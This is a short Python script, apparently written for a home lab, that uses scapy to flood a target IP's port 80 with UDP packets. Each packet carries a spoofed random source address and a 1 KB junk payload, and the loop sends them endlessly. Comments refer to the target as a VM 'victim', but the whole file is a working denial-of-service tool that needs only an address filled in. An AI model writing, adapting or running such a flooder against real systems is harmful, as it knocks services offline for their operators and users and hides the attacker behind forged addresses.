from scapy.all import IP, UDP, send, Raw
import random
import time

# Set the target to your VM's VICTIMS IP address
# I haven't done this one for a flask app yet
target_ip = ""  
target_port = 80  # Target port


def udp_flood():
    while True:
        # Generating the random source IPs (this random bit can be deleted)
        src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        # specifying the payload and creating the packet
        packet = IP(src=src_ip, dst=target_ip) / UDP(sport=random.randint(1024, 65535), dport=target_port) / Raw(load="X" * 1024)
        # Send packet without printing output   
        send(packet, verbose=False)  
        # Printing the packets
        print(f"Sent UDP packet from {src_ip} to {target_ip}:{target_port}")

# Running the attack
udp_flood()
